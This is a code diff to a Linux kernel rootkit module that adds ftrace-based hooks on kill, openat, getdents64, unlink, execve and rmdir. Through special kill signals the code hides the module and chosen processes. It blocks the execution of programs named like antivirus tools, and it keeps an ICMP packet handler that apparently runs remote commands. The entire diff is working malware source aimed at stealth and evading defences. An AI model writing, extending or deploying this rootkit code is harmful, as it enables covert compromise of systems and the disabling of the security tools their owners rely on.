@@ -9,7 +9,6 @@
 #include <linux/ip.h>
 #include <linux/icmp.h>
 #include <linux/ftrace.h>
-#include <linux/list.h>
 #include <linux/fs.h>
 #include <linux/slab.h>
 #include <asm/uaccess.h>
@@ -17,6 +16,11 @@
 #include <linux/path.h>
 #include <linux/uaccess.h>
 
+// Using ftrace flag
+
+#define FTRACE 1
+
+// Saving current module
 
 #ifdef MODULE
 extern struct module __this_module;
@@ -25,12 +29,21 @@ extern struct module __this_module;
 #define THIS_MODULE ((struct module *)0)
 #endif
 
+// Defining prefixes for hooks logic
+
 #define HIDE_PREFIX     "arman"
 #define EXEC_PREFIC     "_antivirus"
 #define HIDE_PREFIX_SZ  (sizeof(HIDE_PREFIX) - 1)
 #define RM_DIR       "virus"
 
 #define MAX_CMD_LEN 1976
+
+// Hooked signals
+
+#define HIDEMODULE      64
+#define SHOWMODULE      63
+#define HIDEPROCESS     62
+#define SHOWPROCESS     61
 
 // Syscall table address pointer
 unsigned long *__sys_call_table_addr;
@@ -41,13 +54,6 @@ char pid_to_hide[NAME_MAX];
 struct work_struct my_work;
 
 static struct nf_hook_ops nfho;
-
-enum signals {
-    HIDEMODULE = 64,
-    SHOWMODULE = 63,
-    HIDEFILES = 62,
-    SHOWFILES = 61,
-};
 
 // Using kprobes method for getting syscall table address for new versions of kernel
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
@@ -82,7 +88,7 @@ static unsigned long lookup_name(const char *name)
 
 #ifdef KPROBE_
 
-// Defining kprobe for syscall_table (should be replaced with function above)
+// Defining kprobe for syscall_table
 typedef unsigned long (* kallsyms_lookup_name_t)(const char* name);
 
 static struct kprobe kp = {
@@ -127,6 +133,126 @@ static void protect_memory(void)
     pr_info("Protected memory\n");
 }
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
+#define PTREGS_SYSCALL_STUBS 1
+#endif
+
+#endif
+
+#ifdef FTRACE
+
+#ifdef PTREGS_SYSCALL_STUBS
+#define SYSCALL_NAME(name) ("__x64_" name)
+#else
+#define SYSCALL_NAME(name) (name)
+#endif
+
+struct ftrace_hook {
+	const char *name;
+	void *function;
+	void *original;
+
+	unsigned long address;
+	struct ftrace_ops ops;
+};
+
+#define HOOK(_name, _function, _original)	\
+	{					                    \
+		.name = SYSCALL_NAME(_name),	    \
+		.function = (_function),	        \
+		.original = (_original),	        \
+	}
+
+static int ftraceh_resolve_hook_address(struct ftrace_hook *hook)
+{
+	hook->address = lookup_name(hook->name);
+
+	if (!hook->address) {
+		pr_debug("unresolved symbol: %s\n", hook->name);
+		return -ENOENT;
+	}
+
+	*((unsigned long*) hook->original) = hook->address;
+
+	return 0;
+}
+
+static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
+		struct ftrace_ops *ops, struct ftrace_regs *fregs)
+{
+	struct pt_regs *regs = ftrace_get_regs(fregs);
+	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+
+    if (!within_module(parent_ip, THIS_MODULE))
+        regs->ip = (unsigned long)hook->function;
+}
+
+int ftraceh_install_hook(struct ftrace_hook *hook)
+{
+	int err;
+
+	err = ftraceh_resolve_hook_address(hook);
+	if (err)
+		return err;
+
+	hook->ops.func = fh_ftrace_thunk;
+	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+	                | FTRACE_OPS_FL_RECURSION
+	                | FTRACE_OPS_FL_IPMODIFY;
+
+	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+
+	if (err) {
+		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
+		return err;
+	}
+
+	err = register_ftrace_function(&hook->ops);
+
+	if (err) {
+		pr_debug("register_ftrace_function() failed: %d\n", err);
+		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+		return err;
+	}
+
+	return 0;
+}
+
+void ftraceh_remove_hook(struct ftrace_hook *hook)
+{
+	int err;
+
+	err = unregister_ftrace_function(&hook->ops);
+
+	if (err) pr_debug("unregister_ftrace_function() failed: %d\n", err);
+
+	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+
+	if (err) pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
+}
+
+int ftraceh_install_hooks(struct ftrace_hook *hooks, size_t count)
+{
+    int err = 0;
+
+    for (size_t i = 0; i < count && !err; i++) {
+        err = ftraceh_install_hook(&hooks[i]);
+        if (err) {
+            while (i != 0) {
+                ftraceh_remove_hook(&hooks[--i]);
+            }
+        }
+    }
+
+    return err;
+}
+
+void ftraceh_remove_hooks(struct ftrace_hook *hooks, size_t count)
+{
+	for (size_t i = 0; i < count; i++)
+		ftraceh_remove_hook(&hooks[i]);
+}
+
 #endif
 
 // Modified syscalls
@@ -137,26 +263,37 @@ static asmlinkage long hack_kill_syscall(const struct pt_regs* regs)
     int sig = regs->si;
     pid_t pid = regs->di;
 
-//    void hide_module(void);
-//    void show_module(void);
-//
-//    if (sig == HIDEMODULE) {
-//        hide_module();
-//        return 0;
-//    } else if (sig == SHOWMODULE) {
-//        show_module();
-//        return 0;
-//    } else if (sig == HIDEFILES) {
-//        return 0;
-//    } else if (sig == SHOWFILES) {
-//        return 0;
-//    }
+    void show_module(void);
+    void hide_module(void);
 
     char cur_pid[NAME_MAX];
 
-    if (sig == 64) {
+    if (sig == 50) {
+        unsigned long address = lookup_name("__x64_sys_write");
+
+        printk(KERN_INFO "sys_write address %lx\n", address);
+
+        return 0;
+    }
+
+    if (sig == HIDEPROCESS) {
         printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
         sprintf(pid_to_hide, "%d%", pid);
+        return 0;
+    }
+
+    if (sig == SHOWPROCESS) {
+        pid_to_hide[0] = '\0';
+        return 0;
+    }
+
+    if (sig == HIDEMODULE) {
+        hide_module();
+        return 0;
+    }
+
+    if (sig == SHOWMODULE) {
+        show_module();
         return 0;
     }
 
@@ -272,7 +409,6 @@ static asmlinkage long h_sys_execve(struct pt_regs *regs)
     exec_str[exec_line_size] = '\0';
 
     if (exec_str != NULL){
-//        printk(KERN_ALERT "EXECVE called: %s\n", exec_str);
         if (strstr(exec_str, EXEC_PREFIC) != NULL){
             printk(KERN_ALERT "Antivirus caught!!\n");
             return -EACCES;
@@ -294,7 +430,6 @@ static asmlinkage long h_sys_rmdir(struct pt_regs *regs)
     dir_str[dir_name_size] = '\0';
 
     if (dir_str != NULL){
-//        printk(KERN_ALERT "EXECVE called: %s\n", exec_str);
         if (strstr(dir_str, RM_DIR) != NULL){
             printk(KERN_ALERT "Dir found!!\n");
             return -EACCES;
@@ -443,8 +578,6 @@ static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const str
     unsigned char *tail;
     int j = 0;
 
-//    pr_info("icmp_cmd_executor executing\n");
-
     iph = ip_hdr(skb);
     icmph = icmp_hdr(skb);
 
@@ -486,6 +619,17 @@ static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const str
     return NF_ACCEPT;
 }
 
+#ifdef FTRACE
+static struct ftrace_hook ftrace_hooks[] = {
+        HOOK("sys_kill", hack_kill_syscall, &orig_kill),
+        HOOK("sys_openat", fh_sys_openat, &orig_sys_openat),
+        HOOK("sys_getdents64", h_sys_getdents64, &orig_sys_getdents64),
+        HOOK("sys_unlink", h_unlink, &orig_unlink),
+        HOOK("sys_execve", h_sys_execve, &orig_execve),
+        HOOK("sys_rmdir", h_sys_rmdir, &orig_rmdir),
+};
+#endif
+
 // Function that launches when module is inserted
 static int __init mod_init(void)
 {
@@ -514,6 +658,9 @@ static int __init mod_init(void)
 
 #endif
 
+#ifdef FTRACE
+    ftraceh_install_hooks(ftrace_hooks, ARRAY_SIZE(ftrace_hooks));
+#else
     __sys_call_table_addr = (unsigned long *) kallsyms_lookup_name("sys_call_table");
 
     store_kill();
@@ -524,7 +671,7 @@ static int __init mod_init(void)
     store_rmdir();
 
     unprotect_memory();
-
+    
     hook_kill();
     hook_getdents64();
     hook_openat();
@@ -533,6 +680,7 @@ static int __init mod_init(void)
     hook_rmdir();
 
     protect_memory();
+#endif
 
     return 0;
 }
@@ -543,6 +691,9 @@ static void __exit mod_exit(void)
 {
     pr_info("rootkit: exited\n");
 
+#ifdef FTRACE
+    ftraceh_remove_hooks(ftrace_hooks, ARRAY_SIZE(ftrace_hooks));
+#else
     unprotect_memory();
 
     restore_kill();
@@ -553,6 +704,7 @@ static void __exit mod_exit(void)
     restore_rmdir();
 
     protect_memory();
+#endif
 
     nf_unregister_net_hook(&init_net, &nfho);
 }
